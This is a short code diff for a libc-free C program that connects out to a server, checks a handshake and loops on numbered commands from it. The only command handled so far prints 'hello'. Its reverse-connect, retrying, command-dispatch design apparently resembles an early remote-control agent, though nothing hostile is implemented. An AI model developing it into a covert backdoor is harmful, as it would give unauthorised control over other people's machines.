@@ -70,15 +70,28 @@ DEC_FUNC(BOOLEAN) write_full(const LONG fd, CONST_PTR(BYTE) buf, const LONG size
 
 
 
-DEC_FUNC(VOID) register_session(const LONG sockFd) {
+DEC_FUNC(BOOLEAN) register_session(const LONG sockFd, session_handshake_t *const sHs) {
+    if (not read_full(sockFd, (BYTE*)sHs, sizeof(*sHs)))
+        return FALSE;
 
+    if (UNLIKELY_(sHs->serverID != LR_SERVER_ID))
+        return FALSE;
+
+    return TRUE;
 }
 
 
 DEC_FUNC(VOID) loop_dispatcher(const LONG sockFd) {
-    register_session(sockFd);
+    session_handshake_t sHs;
+    if (not register_session(sockFd, &sHs)) return;
 
+    server_request_t sReq;
 
+    while (LIKELY_(read_full(sockFd, (BYTE*)&sReq, sizeof(sReq)))) {
+        if (UNLIKELY_(sReq.id != sHs.sessionID)) return;
+
+        if (sReq.command == 17) sys_write(1, "hello\n", 6);
+    }
 }
 
 
@@ -119,7 +132,7 @@ VOID Main(VOID) {
             SOCK_RETRY_DELAY, SOCK_RETRY_MASK);
 
         if (SYSOK(sockFd = sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))) {
-            if (SYSOK(sys_connect(sockFd, &sockHost, sizeof(sockaddr_in))))
+            if (SYSOK(sys_connect(sockFd, &sockHost, sizeof(sockHost))))
                 loop_dispatcher(sockFd);
 
             sys_close(sockFd);
